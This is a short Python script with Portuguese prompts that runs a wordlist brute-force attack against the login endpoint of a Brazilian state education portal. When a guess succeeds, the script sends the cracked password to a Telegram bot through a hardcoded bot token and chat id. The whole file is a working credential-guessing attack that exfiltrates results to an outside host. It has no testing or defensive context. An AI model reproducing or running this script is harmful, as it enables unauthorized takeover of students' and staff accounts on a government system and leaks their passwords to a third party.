import requests

user = input('Usuario: ')
pasw = open(input('Caminho para wordlist: ')).readlines()

def conn():
    for i in pasw:
    	i = i.rstrip()
    	r = requests.post('http://sigeduc.rn.gov.br/sigeduc/logar.do?dispatch=logOn',
                 data = {'user.login':user, 'user.senha':i}).text
    	if 'Selecionar' in (r):
    		print('SENHA CORRETA[+]', i)
    		requests.post('https://api.telegram.org/bot270024270:AAGdHXE0Vcg2c2Fr5dqwRdQTf93dDJaOUMI/sendmessage?chat_id=234228448&text=SENHA_'+i)
    		quit()
    	else:
    		print('Senha incorreta', i)
    		
    		

conn()

#greats Heaven
